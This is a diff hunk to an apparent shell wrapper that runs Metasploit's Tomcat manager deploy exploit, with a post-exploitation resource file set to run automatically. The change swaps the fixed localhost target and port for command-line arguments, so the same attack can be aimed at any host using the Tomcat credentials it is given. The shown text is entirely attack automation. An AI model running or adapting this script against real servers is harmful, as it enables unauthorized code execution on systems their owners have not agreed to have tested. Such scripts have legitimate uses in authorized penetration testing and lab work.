@@ -2,8 +2,8 @@
 
 msfconsole -q -x "use exploit/multi/http/tomcat_mgr_deploy;
 set AutoRunScript multi_console_command -rc ./after.rc;
-set RHOST 127.0.0.1;
-set RPORT 8080;
+set RHOST $4;
+set RPORT $5;
 set HttpUsername $1;
 set HttpPassword $2;
 set PATH $3;
